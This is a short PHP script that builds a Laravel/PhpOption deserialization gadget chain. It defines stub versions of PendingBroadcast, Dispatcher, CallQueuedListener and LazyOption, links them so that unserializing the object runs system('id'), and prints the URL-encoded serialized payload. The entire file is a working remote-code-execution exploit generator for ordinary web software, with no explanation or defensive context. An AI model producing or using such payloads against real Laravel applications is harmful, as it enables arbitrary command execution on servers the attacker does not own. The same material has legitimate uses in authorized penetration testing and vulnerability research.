<?php

namespace Illuminate\Bus{
    class Dispatcher{
        protected $queueResolver;
        public function __construct($queueResolver)
        {
            $this->queueResolver = $queueResolver;
        }
    }
}

namespace Illuminate\Events{
    class CallQueuedListener{
        protected $connection;
        public function __construct($connection)
        {
            $this->connection = $connection;
        }
    }
}

namespace Illuminate\Broadcasting{
    class PendingBroadcast{
        protected $events;
        protected $event;

        public function __construct($events, $event)
        {
            $this->events = $events;
            $this->event = $event;
        }
    }
}

namespace PhpOption{
    final class LazyOption{
        private $callback;
        private $arguments;
        private $option;

        public function __construct($callback, $arguments, $option)
        {
            $this->callback = $callback;
            $this->arguments = $arguments;
            $this->option = $option;
        }

    }
}


namespace{
    $c = new PhpOption\LazyOption('system', array('id'), null);
    $d = new Illuminate\Events\CallQueuedListener('id');
    $b = new Illuminate\Bus\Dispatcher(array($c, 'filter'));
    $a = new Illuminate\Broadcasting\PendingBroadcast($b, $d);
    echo urlencode(serialize($a));
}